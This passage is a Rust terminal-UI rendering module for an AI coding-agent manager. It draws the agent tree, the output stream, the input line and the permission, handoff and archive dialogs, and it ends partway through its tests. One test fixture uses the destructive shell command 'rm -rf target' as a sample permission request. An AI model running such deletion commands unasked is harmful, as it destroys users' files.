//! Draws an [`AppState`] with ratatui.
//!
//! Escaping: `Row.label`, stream lines, `Status.error`,
//! `ConnectionState::Disconnected` reasons, dialog errors and the archive
//! dialog's title are escaped when they are stored in the state and are drawn
//! as they are. Everything else the daemon supplies is escaped here: agent
//! titles in headers (`escape_line`), the pending permission's summary
//! (`escape_text`, newlines kept as line breaks) and editor text
//! (`escape_line`). Ids are validated by the protocol types and kinds, states
//! and providers are fixed names. The permission's `raw` payload is not shown:
//! the summary is the text the user answers.

use ratatui::Frame;
use ratatui::layout::{Constraint, Layout, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Borders, Clear, Paragraph};

use dgc_protocol::ids::AgentId;
use dgc_protocol::model::{AgentState, Isolation, PendingPermission, ProviderKind, SendBehavior};

use super::ConnectionState;
use super::input::LineEditor;
use super::layout::{
    AUTO_APPROVE_WARNING, DIALOG_MAX_WIDTH, HANDOFF_KEYS, LEGEND, NARROW, PermissionLayout,
    SHORTENED_WARNING, SummaryRow, TOO_SMALL, handoff_layout, panes, permission_layout,
    scroll_indicator, tail_cols, text_width, truncate_cols, wrap_line, wrap_text,
};
use super::state::{
    AgentField, AppState, Dialog, Focus, HandoffField, HandoffForm, NewAgentForm, NewWorkspaceForm,
    NodeId, Row, WorkspaceField,
};
use crate::output::{
    escape_line, kind_name, missing_parent_note, provider_name, short_id, state_name,
};

const ACCENT: Color = Color::Cyan;
const WARN: Color = Color::Yellow;
const DANGER: Color = Color::Red;

/// Shown in the tree pane while there is no project.
const EMPTY_TREE_HINT: &str = "no projects \u{2014} add one with: dgc project add <path>";

/// Draw the whole screen.
pub fn render(state: &AppState, frame: &mut Frame) {
    let area = frame.area();
    if area.width == 0 || area.height == 0 {
        return;
    }
    let (tree, right, status) = panes(area);
    let input_height = if state.permission_hint().is_some() {
        4
    } else {
        3
    };
    let [stream, input] =
        Layout::vertical([Constraint::Min(0), Constraint::Length(input_height)]).areas(right);

    render_tree(state, frame, tree);
    render_stream(state, frame, stream);
    let input_cursor = render_input(state, frame, input);
    render_status(state, frame, status);

    let dialog_cursor = render_dialog(state, frame, right);
    if state.dialog.is_none() {
        if let Some(position) = input_cursor {
            frame.set_cursor_position(position);
        }
    } else if let Some(position) = dialog_cursor {
        frame.set_cursor_position(position);
    }
}

// ---- text helpers ----

/// What an editor shows in `width` columns (escaped, scrolled so the cursor
/// stays visible) and the cursor's column in it.
fn editor_view(editor: &LineEditor, width: usize) -> (String, usize) {
    let text = editor.text();
    let split = text
        .char_indices()
        .nth(editor.cursor_chars())
        .map_or(text.len(), |(i, _)| i);
    let before = tail_cols(&escape_line(&text[..split]), width.saturating_sub(1));
    let cursor = text_width(&before);
    let after = truncate_cols(&escape_line(&text[split..]), width.saturating_sub(cursor));
    (format!("{before}{after}"), cursor)
}

fn dim() -> Style {
    Style::default().add_modifier(Modifier::DIM)
}

fn bold() -> Style {
    Style::default().add_modifier(Modifier::BOLD)
}

// ---- tree ----

fn state_symbol(row: &Row) -> (char, Color) {
    if row.waiting_permission {
        return ('!', WARN);
    }
    match row.agent_state {
        Some(AgentState::Starting | AgentState::Running) => ('\u{25cf}', Color::Green),
        Some(AgentState::Idle) => ('\u{25cb}', Color::Reset),
        Some(AgentState::WaitingPermission) => ('!', WARN),
        Some(AgentState::Failed) => ('\u{2717}', DANGER),
        Some(AgentState::Stopped | AgentState::Archived) | None => ('\u{25a0}', Color::DarkGray),
    }
}

fn tree_parent_note(id: &AgentId, room: usize) -> String {
    let note = format!(" {}", missing_parent_note(id));
    if text_width(&note) <= room {
        return note;
    }
    // Drop the constant prefix first so the identifying suffix fits.
    let short = short_id(id);
    let short = short.trim_start_matches(AgentId::PREFIX);
    truncate_cols(&format!(" ↳ parent {short}"), room)
}

fn tree_line(
    row: &Row,
    width: usize,
    narrow: bool,
    selected: bool,
    rate_limited: bool,
) -> Line<'static> {
    let indent = row.depth * if narrow { 1 } else { 2 };
    let mut spans = Vec::new();
    match row.agent_state {
        Some(_) => {
            let (symbol, color) = state_symbol(row);
            let symbol = symbol.to_string();
            let auto = if row.auto_approve { " [auto]" } else { "" };
            let mcp = if row.mcp { " [mcp]" } else { "" };
            let limit_marker = if rate_limited { "⇄ " } else { "" };
            let markers = text_width(&symbol)
                + 1
                + text_width(auto)
                + text_width(mcp)
                + text_width(limit_marker);
            let indent = indent.min(width.saturating_sub(markers + 1));
            let room = width.saturating_sub(indent + markers);
            let note = row.missing_parent.as_ref().map_or_else(String::new, |id| {
                tree_parent_note(id, room.saturating_sub(1))
            });
            let room = room.saturating_sub(text_width(&note));
            // Keep the provider name when at least four columns of the title fit.
            let provider = row
                .provider
                .map(|p| format!("{} ", provider_name(p)))
                .filter(|p| room.saturating_sub(text_width(p)) >= 4)
                .unwrap_or_default();
            let room = room.saturating_sub(text_width(&provider));
            spans.push(Span::raw(" ".repeat(indent)));
            spans.push(Span::styled(symbol, Style::default().fg(color)));
            spans.push(Span::raw(" "));
            spans.push(Span::styled(limit_marker, Style::default().fg(WARN)));
            spans.push(Span::raw(provider));
            spans.push(Span::raw(truncate_cols(&row.label, room)));
            if row.auto_approve {
                spans.push(Span::styled(auto, Style::default().fg(WARN)));
            }
            spans.push(Span::raw(mcp));
            spans.push(Span::styled(note, dim()));
        }
        None => {
            let marker = if row.expanded == Some(true) {
                '\u{25be}'
            } else {
                '\u{25b8}'
            };
            let prefix = format!("{}{marker} ", " ".repeat(indent));
            let room = width.saturating_sub(text_width(&prefix)).max(1);
            spans.push(Span::raw(prefix));
            spans.push(Span::raw(truncate_cols(&row.label, room)));
        }
    }
    let line = Line::from(spans);
    if selected {
        line.style(Style::default().add_modifier(Modifier::REVERSED))
    } else {
        line
    }
}

fn focus_border(focused: bool) -> Style {
    if focused {
        Style::default().fg(ACCENT)
    } else {
        Style::default()
    }
}

fn render_tree(state: &AppState, frame: &mut Frame, area: Rect) {
    let block = Block::default()
        .borders(Borders::ALL)
        .title(" dgc ")
        .border_style(focus_border(state.focus == Focus::Tree));
    let inner = block.inner(area);
    frame.render_widget(block, area);
    let height = usize::from(inner.height);
    if height == 0 || inner.width == 0 {
        return;
    }
    let rows = state.rows();
    if rows.is_empty() {
        let hint = wrapped(EMPTY_TREE_HINT, usize::from(inner.width), dim());
        frame.render_widget(Paragraph::new(hint), inner);
        return;
    }
    let cursor = state.cursor_index();
    let offset = cursor.map_or(0, |c| (c + 1).saturating_sub(height));
    let narrow = frame.area().width < NARROW;
    let lines: Vec<Line> = rows
        .iter()
        .enumerate()
        .skip(offset)
        .take(height)
        .map(|(i, row)| {
            let limited =
                matches!(&row.node, NodeId::Agent(id) if state.rate_limit_reason(id).is_some());
            tree_line(
                row,
                usize::from(inner.width),
                narrow,
                Some(i) == cursor,
                limited,
            )
        })
        .collect();
    frame.render_widget(Paragraph::new(lines), inner);
}

// ---- stream ----

fn stream_title(state: &AppState, agent_id: Option<&AgentId>) -> Line<'static> {
    let Some(agent) = agent_id.and_then(|id| state.tree.agent(id)) else {
        return Line::from(" stream ");
    };
    let mut title = format!(
        " {} {} {} {} ",
        short_id(&agent.id),
        provider_name(agent.provider),
        state_name(agent.state),
        escape_line(&agent.title),
    );
    if state.stream.is_loading() {
        title.push_str("\u{b7} loading ");
    }
    let scroll = state.stream.scroll();
    if scroll > 0 {
        title.push_str(&format!("\u{b7} \u{2191}{scroll} "));
    }
    Line::from(title)
}

fn render_stream(state: &AppState, frame: &mut Frame, area: Rect) {
    let agent_id = state.stream_agent_id();
    let block = Block::default()
        .borders(Borders::ALL)
        .title(stream_title(state, agent_id.as_ref()))
        .border_style(focus_border(false));
    let inner = block.inner(area);
    frame.render_widget(block, area);
    let (width, height) = (usize::from(inner.width), usize::from(inner.height));
    if width == 0 || height == 0 {
        return;
    }
    let suggestion = agent_id.as_ref().and_then(|id| {
        let agent = state.tree.agent(id)?;
        let reason = escape_line(state.rate_limit_reason(id)?);
        let target = provider_name(agent.provider.other());
        let prefix = "rate limited (";
        let suffix = format!(") — H: hand off to {target}");
        let room = width.saturating_sub(text_width(prefix) + text_width(&suffix));
        let hint = if room > 0 {
            format!("{prefix}{}{suffix}", truncate_cols(&reason, room))
        } else {
            format!("⇄ H: hand off to {target}")
        };
        Some(Line::styled(
            truncate_cols(&hint, width),
            Style::default().fg(WARN),
        ))
    });
    let mut lines: Vec<Line> = suggestion.into_iter().collect();
    let height = height.saturating_sub(lines.len());
    lines.extend(match &agent_id {
        None => vec![Line::styled(
            "select an agent (\u{2191}\u{2193}, Enter) to see its stream",
            dim(),
        )],
        Some(id) if state.stream.agent_id() != Some(id) => {
            vec![Line::styled("loading\u{2026}", dim())]
        }
        Some(_) => stream_tail(state, width, height),
    });
    frame.render_widget(Paragraph::new(lines), inner);
}

/// The last `height` wrapped rows ending at the scroll position. Only as
/// many stream lines as fit are wrapped, however long the buffer is.
fn stream_tail(state: &AppState, width: usize, height: usize) -> Vec<Line<'static>> {
    let lines = state.stream.lines();
    let end = lines.len().saturating_sub(state.stream.scroll());
    let mut rows: Vec<String> = Vec::new();
    'collect: for line in lines.iter().take(end).rev() {
        for row in wrap_line(line, width).into_iter().rev() {
            rows.push(row);
            if rows.len() >= height {
                break 'collect;
            }
        }
    }
    rows.into_iter().rev().map(Line::from).collect()
}

// ---- input ----

fn mode_name(mode: SendBehavior) -> &'static str {
    match mode {
        SendBehavior::Queue => "queue",
        SendBehavior::Steer => "steer",
        SendBehavior::Interrupt => "interrupt",
    }
}

fn input_title(state: &AppState) -> Line<'static> {
    let mut spans = vec![Span::raw(" send: ")];
    for (i, mode) in [
        SendBehavior::Queue,
        SendBehavior::Steer,
        SendBehavior::Interrupt,
    ]
    .into_iter()
    .enumerate()
    {
        if i > 0 {
            spans.push(Span::raw("\u{2502}"));
        }
        let style = if mode == state.send_mode {
            Style::default().add_modifier(Modifier::REVERSED | Modifier::BOLD)
        } else {
            dim()
        };
        spans.push(Span::styled(mode_name(mode), style));
    }
    spans.push(Span::raw(" "));
    if let Some(target) = state.input_target()
        && (state.focus == Focus::Input || state.selected_agent_id().as_ref() == Some(&target.id))
    {
        spans.push(Span::raw(format!(
            "\u{2192} {} {} ",
            short_id(&target.id),
            truncate_cols(&escape_line(&target.title), 24)
        )));
    }
    if state.input_target_missing() {
        spans.push(Span::styled(
            "\u{b7} no target \u{2014} select an agent ",
            Style::default().fg(DANGER).add_modifier(Modifier::BOLD),
        ));
    }
    Line::from(spans)
}

/// Draws the input box; returns where the terminal cursor belongs.
fn render_input(state: &AppState, frame: &mut Frame, area: Rect) -> Option<(u16, u16)> {
    let focused = state.focus == Focus::Input;
    let block = Block::default()
        .borders(Borders::ALL)
        .title(input_title(state))
        .border_style(focus_border(focused));
    let inner = block.inner(area);
    frame.render_widget(block, area);
    if inner.width == 0 || inner.height == 0 {
        return None;
    }
    let mut lines = Vec::new();
    if let Some(hint) = state.permission_hint() {
        lines.push(Line::styled(
            truncate_cols(hint, usize::from(inner.width)),
            Style::default()
                .fg(Color::Black)
                .bg(WARN)
                .add_modifier(Modifier::BOLD),
        ));
    }
    let text_row = lines.len();
    let prompt = "> ";
    let room = usize::from(inner.width).saturating_sub(prompt.len());
    let (view, cursor) = editor_view(&state.input, room);
    // The draft belongs to `input_target`: another selection shows none.
    let own_draft = focused || state.selected_agent_id() == state.input_target;
    if (state.input.is_empty() || !own_draft) && !focused {
        lines.push(Line::styled(
            "> press i to type to the selected agent",
            dim(),
        ));
    } else {
        lines.push(Line::from(format!("{prompt}{view}")));
    }
    frame.render_widget(Paragraph::new(lines), inner);
    let row = u16::try_from(text_row).ok()?;
    if !focused || row >= inner.height {
        return None;
    }
    let col = u16::try_from(prompt.len() + cursor).ok()?;
    Some((inner.x + col.min(inner.width - 1), inner.y + row))
}

// ---- status bar ----

fn render_status(state: &AppState, frame: &mut Frame, area: Rect) {
    let mut spans = Vec::new();
    match &state.status.connection {
        ConnectionState::Connected => spans.push(Span::raw("daemon ok")),
        ConnectionState::Disconnected { reason } => spans.push(Span::styled(
            format!("daemon disconnected: {reason}"),
            Style::default().fg(DANGER).add_modifier(Modifier::BOLD),
        )),
        ConnectionState::Reconnecting => spans.push(Span::styled(
            "connecting to daemon\u{2026}",
            Style::default().fg(WARN),
        )),
    }
    spans.push(Span::raw(format!(" \u{b7} {} agents", state.agent_count())));
    let waiting = state.permission_count();
    let waiting_style = if waiting > 0 {
        Style::default().fg(WARN).add_modifier(Modifier::BOLD)
    } else {
        Style::default()
    };
    spans.push(Span::raw(" \u{b7} "));
    spans.push(Span::styled(
        format!("{waiting} waiting permission"),
        waiting_style,
    ));
    if let Some(error) = &state.status.error {
        spans.push(Span::raw(" \u{b7} "));
        spans.push(Span::styled(error.clone(), Style::default().fg(DANGER)));
    }
    if let Some(notice) = &state.status.notice {
        spans.push(Span::raw(" \u{b7} "));
        spans.push(Span::styled(notice.clone(), Style::default().fg(ACCENT)));
    }
    let hints = match state.focus {
        Focus::Tree => {
            "\u{2191}\u{2193} move  Enter open  i type  n agent  w workspace  p permission  \
             H handoff  x stop  r resume  A archive  R refresh  Tab mode  q quit"
        }
        Focus::Input => "Enter send  Tab mode  PgUp/PgDn scroll  Esc back",
        Focus::Dialog => "",
    };
    if let Some(hint) = state.permission_hint() {
        spans.push(Span::raw("  "));
        spans.push(Span::styled(hint, Style::default().fg(WARN)));
    } else if !hints.is_empty() {
        spans.push(Span::raw("  \u{2502}  "));
        spans.push(Span::styled(hints, dim()));
    }
    frame.render_widget(Paragraph::new(Line::from(spans)), area);
}

// ---- dialogs ----

/// What a dialog builder returns: the lines and the (row, column) of the
/// cursor inside them, if a text field has focus.
struct DialogBody {
    title: &'static str,
    border: Color,
    lines: Vec<Line<'static>>,
    cursor: Option<(usize, usize)>,
}

fn render_dialog(state: &AppState, frame: &mut Frame, pane: Rect) -> Option<(u16, u16)> {
    let dialog = state.dialog.as_ref()?;
    if pane.width < 3 || pane.height < 3 {
        return None;
    }
    let area = frame.area();
    let mut width = pane.width.min(DIALOG_MAX_WIDTH);
    let mut max_inner_height = usize::from(pane.height - 2);
    let inner_width = usize::from(width - 2);
    let body = match dialog {
        Dialog::Permission {
            permission,
            sending,
            scroll,
            seen_end,
            ..
        } => {
            // The same layout `update` used to judge a/s, for this terminal.
            let layout = permission_layout((area.width, area.height), &permission.summary);
            width = layout.dialog_width;
            max_inner_height = layout.max_inner_height;
            permission_body(
                state,
                permission,
                &PermissionView {
                    sending: *sending,
                    armed: dialog.permission_armed(),
                    scroll: *scroll,
                    seen_end: *seen_end,
                },
                &layout,
            )
        }
        Dialog::Handoff(form) => handoff_body(state, form, (area.width, area.height)),
        Dialog::NewAgent(form) => agent_body(form, inner_width),
        Dialog::NewWorkspace(form) => workspace_body(form, inner_width),
        Dialog::ConfirmArchive { title, .. } => archive_body(title, inner_width),
    };
    let height = u16::try_from(body.lines.len().min(max_inner_height) + 2).unwrap_or(pane.height);
    let area = Rect {
        x: pane.x + (pane.width - width) / 2,
        y: pane.y + (pane.height - height) / 2,
        width,
        height,
    };
    let block = Block::default()
        .borders(Borders::ALL)
        .title(body.title)
        .border_style(Style::default().fg(body.border));
    let inner = block.inner(area);
    frame.render_widget(Clear, area);
    frame.render_widget(block, area);
    frame.render_widget(Paragraph::new(body.lines), inner);
    let (row, col) = body.cursor?;
    let row = u16::try_from(row).ok()?;
    if row >= inner.height {
        return None;
    }
    let col = u16::try_from(col).ok()?;
    Some((
        inner.x + col.min(inner.width.saturating_sub(1)),
        inner.y + row,
    ))
}

fn wrapped(text: &str, width: usize, style: Style) -> Vec<Line<'static>> {
    wrap_text(text, width)
        .into_iter()
        .map(|row| Line::styled(row, style))
        .collect()
}

/// What the dialog state says about the permission being shown.
struct PermissionView {
    sending: bool,
    armed: bool,
    scroll: usize,
    seen_end: bool,
}

fn legend_lines(layout: &PermissionLayout, view: &PermissionView) -> Vec<Line<'static>> {
    if view.sending {
        return vec![Line::styled(
            "sending answer\u{2026}",
            Style::default().fg(WARN),
        )];
    }
    let enabled = Style::default().add_modifier(Modifier::BOLD);
    let disabled = dim();
    let allow = if view.armed && view.seen_end {
        enabled
    } else {
        disabled
    };
    let styles = [
        allow,
        allow,
        if view.armed { enabled } else { disabled },
        Style::default(),
    ];
    layout
        .legend_rows
        .iter()
        .map(|row| {
            let mut spans = Vec::new();
            for (i, &item) in row.iter().enumerate() {
                if i > 0 {
                    spans.push(Span::raw("  "));
                }
                spans.push(Span::styled(LEGEND[item], styles[item]));
            }
            Line::from(spans)
        })
        .collect()
}

fn permission_body(
    state: &AppState,
    permission: &PendingPermission,
    view: &PermissionView,
    layout: &PermissionLayout,
) -> DialogBody {
    let width = layout.inner_width;
    let hint = if view.armed {
        Line::raw("")
    } else {
        Line::styled("keys enabled shortly", Style::default().fg(WARN))
    };
    let mut lines = Vec::new();
    if layout.too_small {
        // Nothing of the summary fits next to the legend: say so, keep the
        // way to refuse, and never offer allow.
        lines.extend(wrapped(
            TOO_SMALL,
            width,
            Style::default().fg(DANGER).add_modifier(Modifier::BOLD),
        ));
        if !view.armed {
            lines.push(hint);
        }
        lines.extend(legend_lines(layout, view));
        lines.truncate(layout.max_inner_height);
        return DialogBody {
            title: " Permission ",
            border: WARN,
            lines,
            cursor: None,
        };
    }
    let who = match state.tree.agent(&permission.agent_id) {
        Some(agent) => format!(
            "agent: {}  {}  {}",
            short_id(&agent.id),
            provider_name(agent.provider),
            escape_line(&agent.title)
        ),
        None => format!("agent: {}  (unknown)", short_id(&permission.agent_id)),
    };
    // One row: the id and provider come first, a long title is cut.
    lines.push(Line::styled(truncate_cols(&who, width), bold()));
    lines.push(
        if state.stream_agent_id().as_ref() == Some(&permission.agent_id) {
            Line::raw("")
        } else {
            Line::styled("(not the selected agent)", Style::default().fg(WARN))
        },
    );
    lines.push(Line::raw(truncate_cols(
        &format!("kind: {}", kind_name(permission.kind)),
        width,
    )));

    let scroll = view.scroll.min(layout.max_scroll());
    let end = (scroll + layout.visible_rows).min(layout.rows.len());
    lines.extend(layout.rows[scroll..end].iter().map(summary_line));

    lines.push(hint);
    if layout.overflows {
        let (text, style) = if view.seen_end {
            (
                format!("rows {}\u{2013}{end} of {}", scroll + 1, layout.rows.len()),
                dim(),
            )
        } else {
            (
                scroll_indicator(scroll + 1, end, layout.rows.len()),
                Style::default().fg(WARN),
            )
        };
        lines.extend(wrapped(&text, width, style));
    }
    if layout.shortened_rows > 0 {
        lines.extend(wrapped(
            SHORTENED_WARNING,
            width,
            Style::default().fg(DANGER).add_modifier(Modifier::BOLD),
        ));
    }
    lines.extend(legend_lines(layout, view));
    DialogBody {
        title: " Permission ",
        border: WARN,
        lines,
        cursor: None,
    }
}

fn summary_line(row: &SummaryRow) -> Line<'static> {
    let gutter = if row.soft {
        Span::styled("↪", dim())
    } else {
        Span::raw(" ")
    };
    Line::from(vec![gutter, Span::raw(row.text.clone())])
}

fn handoff_body(state: &AppState, form: &HandoffForm, size: (u16, u16)) -> DialogBody {
    let preview = form.preview.as_deref().unwrap_or_default();
    let auto_approve = form.auto_approve_mode();
    let layout = handoff_layout(size, preview, auto_approve);
    let width = layout.width;
    let mut lines = Vec::new();
    if auto_approve {
        lines.extend(wrapped(
            AUTO_APPROVE_WARNING,
            width,
            Style::default().fg(DANGER).add_modifier(Modifier::BOLD),
        ));
    }
    let source = state
        .tree
        .agent(&form.agent_id)
        .map(|agent| escape_line(&agent.title));
    let source = format!(
        "  {:<9}{} {}",
        "source",
        short_id(&form.agent_id),
        source.as_deref().unwrap_or_default()
    );
    lines.push(Line::raw(truncate_cols(&source, width)));
    let profile = form
        .selected_profile()
        .map_or("(none)".to_owned(), |profile| {
            let name = escape_line(&profile.name);
            profile.model.as_ref().map_or(name.clone(), |model| {
                format!("{name} ({})", escape_line(model))
            })
        });
    for (field, label, value, hint) in [
        (
            HandoffField::Provider,
            "target",
            provider_name(form.provider),
            "Tab",
        ),
        (
            HandoffField::Profile,
            "profile",
            profile.as_str(),
            "Tab/Shift-Tab",
        ),
    ] {
        let focused = field == form.field;
        let marker = if focused { "> " } else { "  " };
        let row = format!("{marker}{label:<9}{value}  ({hint})");
        lines.push(Line::styled(
            truncate_cols(&row, width),
            if focused { bold() } else { Style::default() },
        ));
    }
    let mode_focused = !form.submitting && form.field == HandoffField::Mode;
    let (mode, col) = field_line(
        "mode",
        &form.mode,
        mode_focused,
        "(provider default)",
        width,
    );
    let cursor = mode_focused.then_some((lines.len(), col));
    lines.push(mode);

    let scroll = form.scroll.min(layout.max_scroll());
    let end = scroll + layout.visible_rows;
    let message = if form.submitting {
        "creating…".to_owned()
    } else if let Some(error) = &form.error {
        error.clone()
    } else if form.preview_failed {
        "preview unavailable".to_owned()
    } else if form.preview_changed {
        "the state changed — review the new preview".to_owned()
    } else if form.preview.is_none() {
        "loading preview…".to_owned()
    } else if layout.visible_rows == 0 {
        "window too small — enlarge or Esc".to_owned()
    } else if form.ticks_until_armed > 0 {
        "keys enabled shortly".to_owned()
    } else {
        format!("Preview  {}–{end} of {}", scroll + 1, layout.rows.len())
    };
    let status_style = if form.error.is_some() {
        Style::default().fg(DANGER)
    } else {
        dim()
    };
    lines.push(Line::styled(truncate_cols(&message, width), status_style));
    if form.preview.is_some() {
        lines.extend(layout.rows[scroll..end].iter().map(summary_line));
    } else if form.preview_changed && form.error.is_none() && !form.preview_failed {
        lines.push(Line::styled("loading preview…", dim()));
    }
    let keys = if form.preview.is_some() && !form.submitting && layout.visible_rows != 0 {
        HANDOFF_KEYS
    } else {
        "Esc cancel  ↑↓ field"
    };
    lines.extend(wrapped(keys, width, dim()));
    lines.truncate(layout.height);
    DialogBody {
        title: " Handoff ",
        border: ACCENT,
        lines,
        cursor,
    }
}

/// `label: value` rows for one editor field; returns the cursor column when
/// `focused`.
fn field_line(
    label: &str,
    editor: &LineEditor,
    focused: bool,
    placeholder: &str,
    width: usize,
) -> (Line<'static>, usize) {
    let marker = if focused { "> " } else { "  " };
    let prefix = format!("{marker}{label:<9}");
    let room = width.saturating_sub(prefix.len());
    let (view, cursor) = editor_view(editor, room);
    let value = if editor.is_empty() {
        Span::styled(truncate_cols(placeholder, room), dim())
    } else {
        Span::raw(view)
    };
    let style = if focused { bold() } else { Style::default() };
    (
        Line::from(vec![Span::styled(prefix.clone(), style), value]),
        prefix.len() + cursor,
    )
}

fn agent_body(form: &NewAgentForm, width: usize) -> DialogBody {
    let mut lines = if form.auto_approve_mode() {
        wrapped(
            AUTO_APPROVE_WARNING,
            width,
            Style::default().fg(DANGER).add_modifier(Modifier::BOLD),
        )
    } else {
        vec![Line::raw("")]
    };
    let mut cursor = None;
    let profile_focused = form.field == AgentField::Profile;
    let profile = form
        .selected_profile()
        .map_or_else(|| "(none)".to_owned(), |profile| escape_line(&profile.name));
    let mcp = if form.mcp_enabled() { " [mcp]" } else { "" };
    lines.push(Line::styled(
        format!(
            "{}{:<9}{profile}{mcp}  (Tab/Shift-Tab)",
            if profile_focused { "> " } else { "  " },
            "profile"
        ),
        if profile_focused {
            bold()
        } else {
            Style::default()
        },
    ));
    let provider_focused = form.field == AgentField::Provider;
    let provider = match form.provider {
        ProviderKind::Claude => "claude",
        ProviderKind::Codex => "codex",
    };
    lines.push(Line::styled(
        format!(
            "{}{:<9}{provider}  (Tab to switch)",
            if provider_focused { "> " } else { "  " },
            "provider"
        ),
        if provider_focused {
            bold()
        } else {
            Style::default()
        },
    ));
    let fields = [
        (
            "model",
            &form.model,
            AgentField::Model,
            "(provider default)",
        ),
        ("mode", &form.mode, AgentField::Mode, "(provider default)"),
        ("title", &form.title, AgentField::Title, "(from the prompt)"),
        ("prompt", &form.prompt, AgentField::Prompt, "(required)"),
    ];
    for (label, editor, field, placeholder) in fields {
        let focused = form.field == field;
        let (line, col) = field_line(label, editor, focused, placeholder, width);
        if focused {
            cursor = Some((lines.len(), col));
        }
        lines.push(line);
    }
    lines.push(Line::raw(""));
    if let Some(error) = &form.error {
        lines.extend(wrapped(error, width, Style::default().fg(DANGER)));
    }
    if form.submitting {
        lines.push(Line::styled("creating\u{2026}", Style::default().fg(WARN)));
    }
    lines.extend(wrapped(
        "Enter create  Esc cancel  \u{2191}\u{2193} field",
        width,
        dim(),
    ));
    DialogBody {
        title: " New agent ",
        border: ACCENT,
        lines,
        cursor,
    }
}

fn workspace_body(form: &NewWorkspaceForm, width: usize) -> DialogBody {
    let mut lines = vec![Line::raw("")];
    let isolation = match form.isolation {
        Isolation::Local => "local (the project directory)",
        Isolation::Worktree => "worktree (a new git worktree)",
    };
    lines.push(Line::from(format!(
        "  isolation {isolation}  (Tab to switch)"
    )));
    let mut cursor = None;
    if form.isolation == Isolation::Worktree {
        let fields = [
            ("branch", &form.branch, WorkspaceField::Branch, "(required)"),
            ("base", &form.base, WorkspaceField::Base, "(optional)"),
        ];
        for (label, editor, field, placeholder) in fields {
            let focused = form.field == field;
            let (line, col) = field_line(label, editor, focused, placeholder, width);
            if focused {
                cursor = Some((lines.len(), col));
            }
            lines.push(line);
        }
    }
    lines.push(Line::raw(""));
    if let Some(error) = &form.error {
        lines.extend(wrapped(error, width, Style::default().fg(DANGER)));
    }
    if form.submitting {
        lines.push(Line::styled("creating\u{2026}", Style::default().fg(WARN)));
    }
    lines.extend(wrapped("Enter create  Esc cancel", width, dim()));
    DialogBody {
        title: " New workspace ",
        border: ACCENT,
        lines,
        cursor,
    }
}

fn archive_body(title: &str, width: usize) -> DialogBody {
    let mut lines = vec![Line::raw("")];
    lines.extend(wrapped(
        &format!("Archive agent \"{title}\"?"),
        width,
        bold(),
    ));
    lines.push(Line::raw(""));
    lines.push(Line::raw("[y]es  [n]o"));
    DialogBody {
        title: " Archive ",
        border: WARN,
        lines,
        cursor: None,
    }
}

#[cfg(test)]
mod tests {
    use std::path::PathBuf;

    use dgc_protocol::event::{AgentEvent, EventKind};
    use dgc_protocol::ids::{AgentId, PermissionId, ProjectId, WorkspaceId};
    use dgc_protocol::model::{
        Agent, AgentState, Isolation, PendingPermission, PermissionKind, Project, ProviderKind,
        Workspace, WorkspaceState,
    };
    use ratatui::Terminal;
    use ratatui::backend::TestBackend;
    use ratatui::buffer::Buffer;
    use ratatui::style::{Color, Modifier};

    use super::*;
    use crate::tui::input::{Key, KeyInput};
    use crate::tui::state::{
        Dialog, Focus, NewAgentForm, NewWorkspaceForm, NodeId, PERMISSION_ARM_TICKS,
        PERMISSION_HINT, STREAM_CAP,
    };
    use crate::tui::update::update;
    use crate::tui::{AppEvent, Effect, RequestTag};

    struct Fx {
        state: AppState,
        project: Project,
        workspace: Workspace,
        a1: Agent,
        a2: Agent,
    }

    fn agent(
        workspace_id: &WorkspaceId,
        title: &str,
        provider: ProviderKind,
        state: AgentState,
        created_at: &str,
    ) -> Agent {
        Agent {
            id: AgentId::generate(),
            workspace_id: workspace_id.clone(),
            title: title.to_owned(),
            provider,
            model: None,
            mode: None,
            auto_approve: false,
            stop_when_idle: false,
            provider_session_id: None,
            state,
            parent_id: None,
            mcp: false,
            depth: 0,
            labels: Default::default(),
            created_at: created_at.to_owned(),
            last_error: None,
        }
    }

    fn permission(agent_id: &AgentId, summary: &str) -> PendingPermission {
        PendingPermission::new(
            PermissionId::generate(),
            agent_id.clone(),
            PermissionKind::Command,
            summary.to_owned(),
            serde_json::Value::Null,
            String::new(),
        )
    }

    fn text_event(agent_id: &AgentId, seq: u64, text: &str) -> AgentEvent {
        AgentEvent {
            agent_id: agent_id.clone(),
            seq,
            at: String::new(),
            kind: EventKind::AssistantText {
                text: text.to_owned(),
                final_: true,
            },
        }
    }

    impl Fx {
        /// Project "doge-code" with one workspace and two agents:
        /// a1 (claude, running, "fix tests") and a2 (codex, waiting for a
        /// permission, "review"). The cursor is on the project row.
        fn new() -> Self {
            let project = Project {
                id: ProjectId::generate(),
                path: PathBuf::from("/p"),
                name: "doge-code".to_owned(),
                created_at: "2026-01-01T00:00:00Z".to_owned(),
            };
            let workspace = Workspace {
                id: WorkspaceId::generate(),
                project_id: project.id.clone(),
                isolation: Isolation::Local,
                path: PathBuf::from("/p"),
                branch: None,
                base_ref: None,
                state: WorkspaceState::Active,
                owned: false,
                created_at: "2026-01-01T00:00:01Z".to_owned(),
            };
            let a1 = agent(
                &workspace.id,
                "fix tests",
                ProviderKind::Claude,
                AgentState::Running,
                "2026-01-01T00:00:02Z",
            );
            let a2 = agent(
                &workspace.id,
                "review",
                ProviderKind::Codex,
                AgentState::WaitingPermission,
                "2026-01-01T00:00:03Z",
            );
            let mut state = AppState::default();
            update(
                &mut state,
                AppEvent::Snapshot {
                    projects: vec![project.clone()],
                    workspaces: vec![workspace.clone()],
                    agents: vec![a1.clone(), a2.clone()],
                    permissions: vec![permission(&a2.id, "rm -rf target")],
                },
            );
            update(
                &mut state,
                AppEvent::Connection(crate::tui::ConnectionState::Connected),
            );
            update(
                &mut state,
                AppEvent::Resize {
                    width: 120,
                    height: 30,
                },
            );
            Self {
                state,
                project,
                workspace,
                a1,
                a2,
            }
        }

        /// Cursor on `agent`, its stream showing `lines` (one assistant
        /// event each).
        fn select(&mut self, agent: &Agent, lines: &[&str]) {
            self.state.tree.reveal(&NodeId::Agent(agent.id.clone()));
            self.state.stream.reset(Some(agent.id.clone()));
            let events: Vec<AgentEvent> = lines
                .iter()
                .enumerate()
                .map(|(i, l)| text_event(&agent.id, i as u64 + 1, l))
                .collect();
            self.state.stream.history_page(&events);
            self.state.stream.finish_history();
        }
    }

    fn draw(state: &AppState, width: u16, height: u16) -> Buffer {
        let mut terminal = Terminal::new(TestBackend::new(width, height)).expect("test terminal");
        terminal
            .draw(|frame| render(state, frame))
            .expect("draw to test backend");
        terminal.backend().buffer().clone()
    }

    fn rows(buffer: &Buffer) -> Vec<String> {
